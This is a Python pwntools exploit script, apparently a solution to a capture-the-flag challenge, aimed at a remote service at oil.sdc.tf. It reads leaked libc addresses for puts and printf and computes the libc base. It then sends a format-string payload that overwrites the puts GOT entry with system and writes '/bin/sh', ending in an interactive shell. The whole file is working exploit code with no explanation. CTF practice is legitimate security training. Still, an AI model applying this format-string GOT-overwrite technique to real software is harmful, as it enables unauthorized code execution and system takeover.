from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)

if args.REMOTE:
   libc = ELF('libc6_2.27-3ubuntu1.5_amd64.so',checksec=False)
else: 
   libc = ELF('libc6_2.33-6_amd64.so',checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('oil.sdc.tf',1337)
    else:
        return process(e.path)

p = start()

def leak_libc():
   leaks=p.recvline().split(b',')
   puts_addr = int(leaks[0],16)
   printf_addr = int(leaks[1],16)
   log.info("Puts  Leak: %s" %hex(puts_addr))
   log.info("Printf Leak: %s" %hex(printf_addr))
   return puts_addr, printf_addr

def calc_base(puts_addr,printf_addr):
   base_leak_1 = puts_addr - libc.sym['puts']
   base_leak_2 = printf_addr - libc.sym['printf']
   log.info("Base Leak Off Puts: %s" %hex(base_leak_1))
   log.info("Base Leak Off Printf: %s" %hex(base_leak_2))
   libc.address=base_leak_1

def got_write_sys():
   payload_writes = {
         e.got['puts']: libc.sym['system'],
         0x600c80: b'/bin/sh\0' 
   }

   payload = fmtstr_payload(8,payload_writes,write_size='short')
   p.sendline(payload)
   p.recvline()
   p.interactive()

puts_addr, printf_addr = leak_libc()
calc_base(puts_addr,printf_addr)
got_write_sys()
